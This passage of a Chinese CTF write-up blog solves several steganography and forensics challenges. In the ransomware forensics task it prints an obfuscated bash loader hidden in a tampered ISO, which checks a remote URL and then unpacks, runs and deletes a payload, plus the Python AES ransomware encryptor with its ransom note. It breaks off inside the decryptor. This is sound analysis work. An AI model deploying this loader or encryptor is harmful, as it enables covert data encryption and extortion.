# 群友们问的一些来路不明的题

**其实感觉时常做做群友给的题，对自我实力提升其实帮助挺大的**
&lt;!--more--&gt;

{{&lt; admonition type=success title=&#34;阅前须知&#34; open=true &gt;}}

**因为本文的题目大都来源于群友的提问，因此我文章中就不放具体的附件下载链接了**

**如果有需要题目附件的师傅，可以进我的交流群获取附件下载链接**

**进群方式可以参考博客中的 [About](https://goodlunatic.github.io/about/)**

{{&lt; /admonition &gt;}}

## 题目名称 sunset

题目附件给了下面这张图片

![](imgs/image-20240612143721666.png)

上手用 zsteg 扫一下，发现 RGB 三个通道中都藏了一个压缩包

![](imgs/image-20240612143859073.png)

因此我们用以下命令分别导出三个压缩包

```shell
zsteg -e b1,r,lsb,xy sunset.png &gt; 1.zip
zsteg -e b1,g,lsb,xy sunset.png &gt; 2.zip
zsteg -e b1,b,lsb,xy sunset.png &gt; 3.zip
```

解压后分别得到 r.txt g.txt b.txt ，因此猜测是分别导出了三个通道的 hexdump

我们使用以下脚本把三个通道的数据组合一下

```python
def read_channel_data(file_path):
    with open(file_path, &#39;r&#39;) as file:
        channel_data = file.readlines()

    formatted_data = []
    for line in channel_data:
        data = line.split()
        formatted_data.append(data[0] &#43; data[1])

    return &#39;&#39;.join(formatted_data)


def combine_channels_to_bytes(r_data, g_data, b_data):
    binary_data = &#39;&#39;
    for r, g, b in zip(r_data, g_data, b_data):
        r_binary = bin(int(r, 16))[2:].zfill(4)
        g_binary = bin(int(g, 16))[2:].zfill(4)
        b_binary = bin(int(b, 16))[2:].zfill(4)
        # 逐位读取RGB合并后的二进制数据
        binary_data &#43;= &#39;&#39;.join(a &#43; b &#43; c for a, b,
                               c in zip(r_binary, g_binary, b_binary))

    byte_data = bytes([int(binary_data[i:i&#43;8], 2)
                      for i in range(0, len(binary_data), 8)])
    return byte_data


def main():
    # 读取并格式化 R、G、B 通道数据
    r_data = read_channel_data(&#39;r.txt&#39;)
    g_data = read_channel_data(&#39;g.txt&#39;)
    b_data = read_channel_data(&#39;b.txt&#39;)

    # 合并通道数据成字节数据
    byte_data = combine_channels_to_bytes(r_data, g_data, b_data)

    # 将字节数据写入文件
    with open(&#39;1.zip&#39;, &#39;wb&#39;) as f_out:
        f_out.write(byte_data)
    print(&#39;Done&#39;)


if __name__ == &#34;__main__&#34;:
    main()

```

组合后可以得到一个 zip 压缩包，解压后即可得到 flag

![](imgs/image-20240612144707833.png)


## 题目名称 大威天龙

题目附件给了一个DOC和一个加密的RAR压缩包

![](imgs/image-20241217162427407.png)

RAR压缩包的注释中有提示

![](imgs/image-20241217162453240.png)

然后用010打开那个doc，发现其实是一个ZIP压缩包

![](imgs/image-20241217162534874.png)

改后缀为.zip然后解压，在`gogog`路径下可以得到一张JPG图片

![](imgs/image-20241217162629300.jpeg)

结合之前RAR注释中的提示，猜测就是steghide隐写，因此我们直接使用stegseek进行爆破

![](imgs/image-20241217162848465.png)

可以得到一个txt文件，内容如下

![](imgs/image-20241217162955725.png)

因此压缩包解压密码就是：`恭喜你找到了rar压缩包的密码，快去解压吧！`

&gt; Tips:这里有的师傅用010打开会发现看不到中文，是因为这里使用的是GBK编码，可以使用记事本或者CyberChef查看

![](imgs/image-20241217163150370.png)

解压RAR压缩包后可以得到一张PNG图片和一个filename.c的代码

猜测图片被这个代码加密了，因此我们尝试逆向这个代码，结果发现原来的Python代码就写在注释里

![](imgs/image-20241217163442113.png)

![](imgs/image-20241217163637471.png)

因此直接写个脚本还原一下flag.png即可，还原后可以得到一张二维码

```python
from PIL import Image


img = Image.open(r&#34;out.png&#34;)
width,height = img.size
pix = img.load()

new_img = Image.new(&#34;RGBA&#34;, img.size)
new_pix = new_img.load()

for y in range(height):
    for x in range(width):
        b, a, r, g = pix[x, y]
        # 恢复亮度和对比度
        r = (r - 10) / 0.01
        g = (g - 10) / 0.01
        b = (b - 10) / 0.01
        a = (a - 10) / 0.01
        new_pix[x, y] = (int(r), int(g), int(b), int(a))

new_img.show()
new_img.save(r&#34;flag.png&#34;)
```

最后扫码即可得到flag：`flag{5fbb5f2b0f9234576d2742f225044463}`

![](imgs/image-20241217164317654.png)

## 题目名称 外星的凯撒凯撒凯撒

解压附件，可以得到一个DOCX还有一个加密的压缩包

![](imgs/image-20241217170952765.png)

打开DOCX文件，发现里面有一部分文字是白色的，直接全部修改为红色并去除所有格式

![](imgs/image-20241217171536175.png)

然后发现有很多行base64编码，猜测是base64隐写

![](imgs/image-20241217171656620.png)

直接PZ解base64隐写可以得到：`The ciphertext is:I0qwVtx2ft`

然后我们在DOCX中调大缩放，可以看到有一个4music.wav的图标，直接双击即可打开一个wav

![](imgs/image-20241217171854306.png)

播放发现是SSTV，扫描后可以得到密钥：`ccttttf`

![](imgs/image-20241217182044190.png)

![](imgs/image-20241217182052665.png)

然后维吉尼亚解密即可得到压缩包解压密码：`G0odCae2ar`

![](imgs/image-20241217182259005.png)

使用得到的密码解压压缩包后可以得到一个flag.xlsx

把后缀改为.zip然后解压，在sheet1.xml中可以发现有很多内容，因此猜测是设置了特殊格式

然后根据 400行x400列 猜测是藏了一个二维码

![](imgs/image-20241217182445544.png)

因此我们打开flag.xlsx文件，仔细观察发现有的单元格字体是加粗的，我们把加粗的单元格都涂黑

![](imgs/image-20241217182709212.png)

![](imgs/image-20241217182740720.png)

然后调整一下列宽得到一张二维码

![](imgs/image-20241217182855783.png)

最后扫码即可得到flag：`flag{Cae2ar&#43;Cae2ar&#43;Cae2ar&#43;...=Vigenre}`

![](imgs/image-20241217183113697.png)

## 题目名称 图的点很奇怪

题目附件给了一张PNG图片还有一个加密的ZIP压缩包，猜测需要从PNG图片中获取压缩包的解压密码

![](imgs/image-20241218193239301.png)

用010打开这张PNG图片，提示报错，仔细观察发现是图片chunk的CTYPE被修改了，尝试改回IDAT

![](imgs/image-20241218193434241.png)

然后发现图片末尾有多余的数据，尝试删除多余的数据

![](imgs/image-20241218193558124.png)

多余的数据删除后，图片就可以正常显示了，010中打开也没有报错了

放大图片查看，发现图片中有很多间隔相同的小点，猜测是隐写了另一张图片

![](imgs/image-20241218193727094.png)

因此我们尝试提取等距像素点，可以提取出来下面这张图片

![](imgs/image-20241218193916026.png)

因此压缩包的解压密码就是：`$df&amp;vK1RGqoj`，用得到的压缩包密码解压后可以得到下图

![](imgs/image-20241218194027697.png)

010打开上图，发现末尾藏了一张数据逆置后的PNG图片

![](imgs/image-20241218194114298.png)

直接把末尾的数据复制出来CyberChef转换一下即可得到flag：`flag{d4405ce1-3aac-ffb1-68af11-7d93e2066a}`

![](imgs/image-20241218194211209.png)

## 题目名称 cat(技能兴鲁)

题目附件给了一个cat_encode.py还有一张cat.png

![](imgs/image-20241218194619452.png)

cat_encode.py的内容如下

```python
def arnold_encode(image, shuffle_times, a, b):
    arnold_image = np.zeros(shape=image.shape)
    h, w = image.shape[0], image.shape[1]
    N = h
    for time in range(shuffle_times):
        for ori_x in range(h):
            for ori_y in range(w):

                new_x = (1*ori_x &#43; b*ori_y)% N
                new_y = (a*ori_x &#43; (a*b&#43;1)*ori_y) % N

                arnold_image[new_x, new_y, :] = image[ori_x, ori_y, :]

        image = np.copy(arnold_image)
    cv2.imwrite(&#39;cat.png&#39;, arnold_image, [int(cv2.IMWRITE_PNG_COMPRESSION), 0])
    return arnold_image
```

很明显就是经典的arnold猫脸变换了，但是没有给我们shuffle_times、a、b

因此猜测需要我们进行爆破，编写以下脚本进行爆破即可，当然能爆破的前提是三个值都不会太大

```python
import matplotlib.pyplot as plt
import cv2
import numpy as np

def arnold_decode(image, shuffle_times, a, b):
    &#34;&#34;&#34; decode for rgb image that encoded by Arnold
    Args:
        image: rgb image encoded by Arnold
        shuffle_times: how many times to shuffle
    Returns:
        decode image
    &#34;&#34;&#34;
    # 1:创建新图像
    decode_image = np.zeros(shape=image.shape)
    # 2：计算N
    h, w = image.shape[0], image.shape[1]
    N = h  # 或N=w

    # 3：遍历像素坐标变换
    for time in range(shuffle_times):
        for ori_x in range(h):
            for ori_y in range(w):
                # 按照公式坐标变换
                new_x = ((a * b &#43; 1) * ori_x &#43; (-b) * ori_y) % N
                new_y = ((-a) * ori_x &#43; ori_y) % N
                decode_image[new_x, new_y, :] = image[ori_x, ori_y, :]
        image = np.copy(decode_image)
        
    return image

def arnold_brute(image,shuffle_times_range,a_range,b_range):
    for c in range(shuffle_times_range[0],shuffle_times_range[1]):
        for a in range(a_range[0],a_range[1]):
            for b in range(b_range[0],b_range[1]):
                print(f&#34;[&#43;] Trying shuffle_times={c} a={a} b={b}&#34;)
                decoded_img = arnold_decode(image,c,a,b)
                output_filename = f&#34;flag_decodedc{c}_a{a}_b{b}.png&#34;
                cv2.imwrite(output_filename, decoded_img, [int(cv2.IMWRITE_PNG_COMPRESSION), 0])
                
if __name__ == &#34;__main__&#34;:
    img = cv2.imread(&#34;cat.png&#34;)
    arnold_brute(img, (1,6), (1,11), (1,11))
```

最后发现当shuffle_times=3、a=6、b=9时可以得到下图

![](imgs/image-20241218200611778.png)

因此最后的flag就是：`flag{022ae0e0-c61e-428c-9f76-2eb089a58348}`

## 题目名称 被偷梁换柱的镜像

题目背景如下：

&gt; 公司的运维人员使用了其U盘上的华为OpenEuler国产操作系统的ISO镜像，来给多台服务器安装系统，殊不知这些系统已经被悄悄的替换并嵌入了勒索病毒。。。多个月后，病毒偷偷的把数据加密了，你能帮忙分析并解密吗？

附件给了一个被加密的文件还有一个ISO镜像文件

ISO镜像直接双击挂载或者用Disk Genius挂载可以得到安装的镜像`install.img`

![](imgs/image-20241218131830249.png)

`install.img`因为系统格式不同，因此Windows下无法直接挂载

但是img镜像其实就是一个压缩包，用bandzip可能无法正常解压，但是我们可以使用7zip进行解压

第一层解压可以得到`rootfs.img`，再解压一层即可得到Linux的文件系统

![](imgs/image-20241218132121101.png)

然后我们在`\rootfs\var\adm`路径下可以得到一个`runrunrun.bash`，内容如下

```bash
z=&#34;
&#34;;lDz=&#39;Hz&#39;;Oz=&#39;id&#39;;VFz=&#39;y&#39;;jDz=&#39;$B&#39;;TCz=&#39;;G&#39;;MEz=&#39;gz&#39;;GDz=&#39;&#39;\&#39;&#39;j&#39;;az=&#39;&#34;&#39;;OCz=&#39;4&#39;\&#39;&#39;&#39;;ez=&#39;se&#39;;rDz=&#39;Mz&#39;;Vz=&#39;/n&#39;;XDz=&#39;&#39;\&#39;&#39;D&#39;;KEz=&#39;$d&#39;;Cz=&#39;UR&#39;;HEz=&#39;$b&#39;;dEz=&#39;Oz&#39;;IEz=&#39;cz&#39;;qz=&#39;if&#39;;eDz=&#39;z$&#39;;Fz=&#39;tt&#39;;XEz=&#39;$s&#39;;OFz=&#39;ch&#39;;kz=&#39; &#34;&#39;;IBz=&#39;=&#39;\&#39;&#39;&#39;;EEz=&#39;Vz&#39;;IDz=&#39; &#39;\&#39;&#39;&#39;;qBz=&#39;Uz&#39;;LEz=&#39;$f&#39;;TEz=&#39;nz&#39;;oz=&#39;RL&#39;;MBz=&#39;&#39;\&#39;&#39;;&#39;;cz=&#39;sp&#39;;tFz=&#39;at&#39;;lEz=&#39;GB&#39;;ACz=&#39;&#39;\&#39;&#39;v&#39;;oBz=&#39;;O&#39;;RBz=&#39;Gz&#39;;Jz=&#39;pi&#39;;kBz=&#39;Cz&#39;;JEz=&#39;$c&#39;;KFz=&#39;d &#39;;bEz=&#39;xz&#39;;VBz=&#39;m&#39;\&#39;&#39;&#39;;CDz=&#39;&#39;\&#39;&#39;X&#39;;wEz=&#39;si&#39;;vCz=&#39;tz&#39;;DBz=&#39; t&#39;;KDz=&#39;&#39;\&#39;&#39;F&#39;;UDz=&#39;;V&#39;;WBz=&#39;;B&#39;;dz=&#39;on&#39;;dDz=&#39;al&#39;;XFz=&#39;40&#39;;YEz=&#39;$u&#39;;SEz=&#39;$m&#39;;YBz=&#39;IB&#39;;DCz=&#39;CB&#39;;eEz=&#39;Lz&#39;;YDz=&#39;wz&#39;;ZFz=&#39;py&#39;;rCz=&#39;Wz&#39;;FEz=&#39;$Z&#39;;yDz=&#39;$U&#39;;TBz=&#39;;J&#39;;OBz=&#39;O&#39;\&#39;&#39;&#39;;xDz=&#39;$T&#39;;dFz=&#39;/r&#39;;EFz=&#39;/R&#39;;eBz=&#39;;k&#39;;YFz=&#39;0 &#39;;qEz=&#39;un&#39;;TDz=&#39;,&#39;\&#39;&#39;&#39;;Kz=&#39;.b&#39;;UCz=&#39;h&#39;\&#39;&#39;&#39;;jCz=&#39;jz&#39;;Ez=&#39;&#34;h&#39;;aDz=&#39;;P&#39;;pCz=&#39;;d&#39;;JCz=&#39;vz&#39;;PDz=&#39;M&#39;\&#39;&#39;&#39;;hCz=&#39;;m&#39;;iz=&#39;l &#39;;Iz=&#39;/a&#39;;mEz=&#39;$D&#39;;qCz=&#39;&#39;\&#39;&#39;c&#39;;ECz=&#39;&#39;\&#39;&#39;/&#39;;UEz=&#39;$o&#39;;XBz=&#39;&#39;\&#39;&#39;{&#39;;UFz=&#39;.p&#39;;iDz=&#39;Az&#39;;QEz=&#39;$k&#39;;cBz=&#39;;F&#39;;nz=&#39;_U&#39;;yBz=&#39;;H&#39;;bz=&#39;re&#39;;jz=&#39;-s&#39;;BBz=&#39;&#34; &#39;;tBz=&#39;&#39;\&#39;&#39;%&#39;;HDz=&#39;Fz&#39;;HBz=&#39;Jz&#39;;vEz=&#39;pa&#39;;HCz=&#39;;c&#39;;CCz=&#39;&#39;\&#39;&#39;)&#39;;eFz=&#39;oo&#39;;NFz=&#39;/.&#39;;sz=&#39;$r&#39;;hEz=&#39;$X&#39;;aEz=&#39;$w&#39;;sCz=&#39;x&#39;\&#39;&#39;&#39;;fFz=&#39;t/&#39;;BCz=&#39;DB&#39;;LCz=&#39;;S&#39;;rz=&#39; [&#39;;FBz=&#39;z=&#39;;tEz=&#39;-P&#39;;RDz=&#39;&#39;\&#39;&#39;7&#39;;OEz=&#39;$i&#39;;Az=&#39;AP&#39;;kCz=&#39;Z&#39;\&#39;&#39;&#39;;kEz=&#39;FB&#39;;uFz=&#39;e.&#39;;Sz=&#39;/c&#39;;SCz=&#39;~&#39;\&#39;&#39;&#39;;MFz=&#39;mp&#39;;bBz=&#39;a&#39;\&#39;&#39;&#39;;VEz=&#39;$p&#39;;lz=&#39;$A&#39;;gDz=&#39;$E&#39;;FFz=&#39;TL&#39;;VDz=&#39;&#39;\&#39;&#39;&#39;\&#39;&#39;&#39;;REz=&#39;lz&#39;;qDz=&#39;$M&#39;;sBz=&#39;;x&#39;;SBz=&#39;e&#39;\&#39;&#39;&#39;;eCz=&#39;&#39;\&#39;&#39;@&#39;;oCz=&#39;2&#39;\&#39;&#39;&#39;;Tz=&#39;he&#39;;fCz=&#39;yz&#39;;mDz=&#39;$I&#39;;JBz=&#39;l&#39;\&#39;&#39;&#39;;uz=&#39;po&#39;;RFz=&#39;up&#39;;BFz=&#39;fi&#39;;FCz=&#39;oz&#39;;SDz=&#39;uz&#39;;QCz=&#39;&#39;\&#39;&#39;9&#39;;IFz=&#39;in&#39;;aFz=&#39;th&#39;;YCz=&#39;&#39;\&#39;&#39;y&#39;;cCz=&#39;}&#39;\&#39;&#39;&#39;;DFz=&#39;wa&#39;;PFz=&#39;ec&#39;;RCz=&#39;Dz&#39;;aCz=&#39;&#39;\&#39;&#39;1&#39;;Rz=&#39;om&#39;;FDz=&#39;;n&#39;;nDz=&#39;$K&#39;;tDz=&#39;$O&#39;;ZEz=&#39;$v&#39;;CBz=&#39;];&#39;;iFz=&#39;an&#39;;cFz=&#39;y &#39;;ZDz=&#39;|&#39;\&#39;&#39;&#39;;jBz=&#39;&#39;\&#39;&#39;&#34;&#39;;iBz=&#39;;K&#39;;DDz=&#39;Rz&#39;;mFz=&#39; &amp;&#39;;Bz=&#39;I_&#39;;vDz=&#39;$Q&#39;;mBz=&#39;;A&#39;;EDz=&#39;\&#39;\&#39;&#39;&#39;;JDz=&#39;;f&#39;;LBz=&#39;&#39;\&#39;&#39;d&#39;;Wz=&#39;ee&#39;;XCz=&#39;;T&#39;;sDz=&#39;$N&#39;;ICz=&#39;&#39;\&#39;&#39;6&#39;;yEz=&#39;de&#39;;WDz=&#39;;Q&#39;;vz=&#39;ns&#39;;ODz=&#39;pz&#39;;Lz=&#39;ai&#39;;bDz=&#39;&#39;\&#39;&#39;L&#39;;pEz=&#39;z&#34;&#39;;NDz=&#39;&#39;\&#39;&#39;$&#39;;dCz=&#39;;M&#39;;kFz=&#39;ta&#39;;kDz=&#39;$G&#39;;Mz=&#39;du&#39;;yCz=&#39;Zz&#39;;PBz=&#39;;L&#39;;SFz=&#39;da&#39;;tz=&#39;es&#39;;ZCz=&#39;BB&#39;;xBz=&#39;#&#39;\&#39;&#39;&#39;;oDz=&#39;$L&#39;;MDz=&#39;t&#39;\&#39;&#39;&#39;;pz=&#39;&#34;)&#39;;mCz=&#39;&#39;\&#39;&#39;n&#39;;GCz=&#39;E&#39;\&#39;&#39;&#39;;AFz=&#39; /&#39;;PCz=&#39;;l&#39;;PEz=&#39;$j&#39;;xz=&#39; =&#39;;oEz=&#39;$h&#39;;DEz=&#39;$Y&#39;;vBz=&#39;&#39;\&#39;&#39;R&#39;;rFz=&#39;_u&#39;;UBz=&#39;Bz&#39;;jEz=&#39;$x&#39;;LDz=&#39;bz&#39;;QFz=&#39;k_&#39;;wBz=&#39;Nz&#39;;wz=&#39;e&#34;&#39;;oFz=&#39;10&#39;;hz=&#39;ur&#39;;WEz=&#39;Qz&#39;;fDz=&#39;$C&#39;;jFz=&#39;t_&#39;;nBz=&#39;b&#39;\&#39;&#39;&#39;;MCz=&#39;&#39;\&#39;&#39;`&#39;;WCz=&#39;3&#39;\&#39;&#39;&#39;;pDz=&#39;Kz&#39;;iEz=&#39;EB&#39;;KBz=&#39;;i&#39;;AEz=&#39;$V&#39;;gz=&#39;(c&#39;;cEz=&#39;$y&#39;;nEz=&#39;iz&#39;;uDz=&#39;Pz&#39;;Dz=&#39;L=&#39;;nFz=&#39;sl&#39;;rEz=&#39;zi&#39;;uCz=&#39;&#39;\&#39;&#39;z&#39;;lFz=&#39;/*&#39;;NEz=&#39;hz&#39;;pFz=&#39;tm&#39;;uBz=&#39;HB&#39;;xCz=&#39;&#39;\&#39;&#39;g&#39;;VCz=&#39;;E&#39;;Uz=&#39;ck&#39;;bCz=&#39;Ez&#39;;HFz=&#39;25&#39;;lBz=&#39;*&#39;\&#39;&#39;&#39;;CFz=&#39;rm&#39;;JFz=&#39; -&#39;;GFz=&#39;81&#39;;EBz=&#39;n&#39;;gBz=&#39;ez&#39;;qFz=&#39;p/&#39;;iCz=&#39;&#39;\&#39;&#39;I&#39;;TFz=&#39;te&#39;;ADz=&#39;i&#39;\&#39;&#39;&#39;;hDz=&#39;$F&#39;;wCz=&#39;;s&#39;;yz=&#39;= &#39;;GEz=&#39;az&#39;;WFz=&#39;mo&#39;;Gz=&#39;ps&#39;;mz=&#39;PI&#39;;sFz=&#39;pd&#39;;sEz=&#39;p &#39;;QDz=&#39;;X&#39;;Qz=&#39;.c&#39;;xEz=&#39;wo&#39;;fBz=&#39;&#39;\&#39;&#39;U&#39;;ABz=&#39;&#34;y&#39;;gFz=&#39;im&#39;;CEz=&#39;Xz&#39;;LFz=&#39;/t&#39;;dBz=&#39;Q&#39;\&#39;&#39;&#39;;GBz=&#39;&#34;;&#39;;Xz=&#39;d/&#39;;NBz=&#39;rz&#39;;Pz=&#39;ub&#39;;Zz=&#39;ed&#39;;BDz=&#39;;h&#39;;Nz=&#39;ba&#39;;ZBz=&#39;&#39;\&#39;&#39;-&#39;;QBz=&#39;&#39;\&#39;&#39;(&#39;;hFz=&#39;rt&#39;;bFz=&#39;3 &#39;;lCz=&#39;;a&#39;;tCz=&#39;;g&#39;;pBz=&#39;&#39;\&#39;&#39;s&#39;;cDz=&#39;ev&#39;;uEz=&#39; $&#39;;BEz=&#39;$W&#39;;gEz=&#39;$J&#39;;NCz=&#39;qz&#39;;nCz=&#39;Yz&#39;;fz=&#39;=$&#39;;fEz=&#39;$R&#39;;Hz=&#39;:/&#39;;hBz=&#39;G&#39;\&#39;&#39;&#39;;wDz=&#39;$S&#39;;gCz=&#39;&#43;&#39;\&#39;&#39;&#39;;aBz=&#39;Iz&#39;;Yz=&#39;lo&#39;;KCz=&#39;^&#39;\&#39;&#39;&#39;;rBz=&#39;p&#39;\&#39;&#39;&#39;;

echo &#34;$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Lz$Mz$Nz$Oz$Pz$Lz$Mz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Uz$Zz$az$z$bz$cz$dz$ez$fz$gz$hz$iz$jz$kz$lz$mz$nz$oz$pz$z$qz$rz$kz$sz$tz$uz$vz$wz$xz$yz$ABz$tz$BBz$CBz$DBz$Tz$EBz$z$FBz$az$z$GBz$HBz$IBz$JBz$KBz$FBz$LBz$MBz$NBz$IBz$OBz$PBz$FBz$QBz$MBz$RBz$IBz$SBz$TBz$UBz$IBz$VBz$WBz$FBz$XBz$MBz$YBz$FBz$ZBz$MBz$aBz$IBz$bBz$cBz$UBz$IBz$dBz$eBz$FBz$fBz$MBz$gBz$IBz$hBz$iBz$FBz$jBz$MBz$kBz$IBz$lBz$mBz$UBz$IBz$nBz$oBz$FBz$pBz$MBz$qBz$IBz$rBz$sBz$FBz$tBz$MBz$uBz$FBz$vBz$MBz$wBz$IBz$xBz$yBz$FBz$ACz$MBz$BCz$FBz$CCz$MBz$DCz$FBz$ECz$MBz$FCz$IBz$GCz$HCz$FBz$ICz$MBz$JCz$IBz$KCz$LCz$FBz$MCz$MBz$NCz$IBz$OCz$PCz$FBz$QCz$MBz$RCz$IBz$SCz$TCz$UBz$IBz$UCz$VCz$UBz$IBz$WCz$XCz$FBz$YCz$MBz$ZCz$FBz$aCz$MBz$bCz$IBz$cCz$dCz$FBz$eCz$MBz$fCz$IBz$gCz$hCz$FBz$iCz$MBz$jCz$IBz$kCz$lCz$FBz$mCz$MBz$nCz$IBz$oCz$pCz$FBz$qCz$MBz$rCz$IBz$sCz$tCz$FBz$uCz$MBz$vCz$IBz$IBz$wCz$FBz$xCz$MBz$yCz$IBz$ADz$BDz$FBz$CDz$MBz$DDz$IBz$EDz$FDz$FBz$GDz$MBz$HDz$IBz$IDz$JDz$FBz$KDz$MBz$LDz$IBz$MDz$mBz$FBz$NDz$MBz$ODz$IBz$PDz$QDz$FBz$RDz$MBz$SDz$IBz$TDz$UDz$FBz$VDz$EDz$VDz$WDz$FBz$XDz$MBz$YDz$IBz$ZDz$aDz$FBz$bDz$MBz$z$cDz$dDz$kz$lz$eDz$UBz$fDz$eDz$RCz$gDz$eDz$HDz$hDz$eDz$iDz$jDz$eDz$kBz$gDz$eDz$HDz$kDz$eDz$lDz$lz$eDz$UBz$fDz$eDz$bCz$mDz$eDz$HBz$hDz$eDz$HDz$nDz$eDz$iDz$oDz$eDz$HDz$hDz$eDz$HDz$hDz$eDz$pDz$lz$eDz$UBz$qDz$eDz$RCz$gDz$eDz$pDz$hDz$eDz$iDz$jDz$eDz$rDz$sDz$eDz$aBz$tDz$eDz$uDz$vDz$eDz$DDz$wDz$eDz$rDz$xDz$eDz$bCz$hDz$eDz$HDz$yDz$eDz$iDz$AEz$eDz$DDz$BEz$eDz$CEz$DEz$eDz$EEz$FEz$eDz$GEz$HEz$eDz$iDz$AEz$eDz$DDz$BEz$eDz$IEz$JEz$eDz$EEz$hDz$eDz$pDz$KEz$eDz$gBz$LEz$eDz$MEz$mDz$eDz$NEz$OEz$eDz$lDz$PEz$eDz$gBz$QEz$eDz$REz$SEz$eDz$TEz$UEz$eDz$nCz$VEz$eDz$TEz$QEz$eDz$NCz$sz$eDz$WEz$XEz$eDz$NCz$SEz$eDz$TEz$tDz$eDz$vCz$nDz$eDz$HDz$hDz$eDz$iDz$jDz$eDz$rDz$YEz$eDz$bCz$hDz$eDz$HDz$nDz$eDz$iDz$jDz$eDz$rDz$ZEz$eDz$JCz$gDz$eDz$pDz$hDz$eDz$HDz$aEz$eDz$HDz$hDz$eDz$HDz$lz$eDz$UBz$fDz$eDz$bEz$sz$eDz$MEz$cEz$eDz$HBz$gDz$eDz$HDz$hDz$eDz$HDz$lz$UBz$AEz$eDz$EEz$mDz$eDz$dEz$AEz$eDz$EEz$kDz$eDz$iDz$oDz$eDz$eEz$hDz$eDz$HDz$hDz$eDz$eEz$oDz$eDz$ZCz$eDz$iDz$jDz$eDz$kBz$fDz$UBz$fEz$eDz$BCz$eDz$TEz$jDz$UBz$gEz$eDz$fCz$HEz$eDz$DCz$eDz$TEz$KEz$eDz$JCz$hEz$eDz$bCz$jDz$UBz$sDz$eDz$pDz$jDz$UBz$nDz$eDz$kBz$jDz$UBz$nDz$eDz$iEz$eDz$pDz$sDz$eDz$ZCz$eDz$BCz$eDz$fCz$gDz$UBz$nDz$eDz$wBz$nDz$eDz$pDz$jDz$UBz$nDz$eDz$pDz$lz$eDz$UBz$qDz$eDz$bEz$jEz$eDz$kEz$eDz$lEz$eDz$uBz$eDz$kEz$eDz$bCz$nDz$eDz$nCz$mEz$UBz$hDz$eDz$BCz$eDz$BCz$eDz$pDz$nDz$eDz$NCz$hDz$eDz$YBz$eDz$nEz$hDz$eDz$HDz$lz$eDz$UBz$qDz$eDz$bEz$sDz$eDz$lDz$gEz$UBz$oEz$eDz$uDz$fEz$eDz$BCz$eDz$wBz$gDz$eDz$HDz$hDz$eDz$HDz$hDz$eDz$BCz$eDz$pDz$hDz$eDz$HDz$nDz$eDz$iDz$jDz$eDz$rDz$YEz$eDz$bCz$nDz$pEz$z$qEz$rEz$sEz$tEz$uEz$vEz$wEz$xEz$yEz$AFz$BFz$CFz$DFz$bz$EFz$FFz$GFz$HFz$Kz$IFz$JFz$KFz$LFz$MFz$NFz$OFz$PFz$QFz$RFz$SFz$TFz$UFz$VFz$z$OFz$WFz$KFz$XFz$YFz$LFz$MFz$NFz$OFz$PFz$QFz$RFz$SFz$TFz$UFz$VFz$z$ZFz$aFz$dz$bFz$LFz$MFz$NFz$OFz$PFz$QFz$RFz$SFz$TFz$UFz$cFz$dFz$eFz$fFz$gFz$uz$hFz$iFz$jFz$SFz$kFz$lFz$mFz$z$nFz$Wz$sEz$oFz$z$CFz$AFz$pFz$qFz$Qz$Tz$Uz$rFz$sFz$tFz$uFz$ZFz$z$BFz&#34;
```

&gt; Tips：在做取证题过程中如果发现文件较多，其实可以把文件按照时间排序一下，这样可以大大缩短定位时间

是一个加了混淆的bash脚本，代码不长，我们可以手动解一下这个混淆

```bash
API_URL=&#34;https://api.baidubaidubaidubaidubaidu.com/check/need/locked&#34;
response=$(curl -s &#34;$API_URL&#34;)
if [ &#34;$response&#34; == &#34;yes&#34; ]; then
eval &#39;printf &#34;cGFzaXdvZGU9IjE2MjU4ODg4Ijs=&#34; |  base64 -d&#39;
unzip -P $pasiwode /firmware/RTL8125.bin -d /tmp/.check_update.py
chmod 400 /tmp/.check_update.py
python3 /tmp/.check_update.py /root/important_data/* &amp;
sleep 10
rm /tmp/.check_update.py
fi
```

其实就是base64解码得到压缩包解压密码：`16258888`，然后解压的过程，然后压缩包中的文件就是加密代码

![](imgs/image-20241218132440673.png)

因此我们接下来需要去找加密代码，发现7zip直接解压出来会丢失这部分的文件

![](imgs/image-20241218133417809.png)

所以我们使用`Disk Genius`的恢复文件功能去恢复加密的压缩包以及里面的加密代码

![](imgs/image-20241218132716931.png)

改后缀为.zip，然后使用得到的压缩包密码解压即可得到加密代码，内容如下：

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import hashlib
import time
import sys

NODecryptionForYouFFFFFFF = sys.argv[1]

def NODecryptionForYou1(NODecryptionForYou5):
    NODecryptionForYou6 = hashlib.md5(str(NODecryptionForYou5).encode(&#39;utf-8&#39;)).digest()
    return NODecryptionForYou6[:16]

def NODecryptionForYou2(NODecryptionForYou4, NODecryptionForYou11, NODecryptionForYou12):
    cipher = AES.new(NODecryptionForYou4, AES.MODE_CBC)
    with open(NODecryptionForYou11, &#39;rb&#39;) as NODecryptionForYouMAN8IN:
        NODecryptionForYou7 = NODecryptionForYouMAN8IN.read()
    NODecryptionForYou8 = cipher.iv &#43; cipher.encrypt(pad(NODecryptionForYou7, AES.block_size))
    with open(NODecryptionForYou12, &#39;wb&#39;) as NODecryptionForYouMAN8OUT:
        NODecryptionForYouMAN8OUT.write(NODecryptionForYou8)

NODecryptionForYou5 = int(time.time())
NODecryptionForYou4 = NODecryptionForYou1(NODecryptionForYou5)
NODecryptionForYou3 = f&#39;{NODecryptionForYou5}.locked&#39;
NODecryptionForYou2(NODecryptionForYou4, NODecryptionForYouFFFFFFF, NODecryptionForYou3)

print(&#34;SEND 1000 BTC TO [asdjjkh1iuhfihuiu1yrueo-this-is-fake-addr] for decryption, OR WE WILL LEAK ALL YOU DATA!!!&#34;)
```

代码逻辑并不复杂，就是用时间戳MD5值的前16位作为key去进行AES-CBC加密，然后IV保存在加密后文件的前16字节中

解密的思路也比较简单，懒得自己手写了，直接GPT秒了

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import hashlib

def NODecryptionForYou1(timestamp):
    # 通过时间戳生成密钥
    NODecryptionForYou6 = hashlib.md5(str(timestamp).encode(&#39;utf-8&#39;)).digest()
    return NODecryptionForYou6[:16]

def NODecryptionForYou2(key, enc_file, output_file):
    with open(enc_file, &#39;rb&#39;) as f:
        enc_data = f.read()
    
    # 从加密文件中提取 IV 和密文
    iv = enc_data[:16]  # 前 16 字节是 IV
    cipher_text = enc_data[16:]  # 剩下的是密文
    
    # 使用 AES CBC 模式进行解密
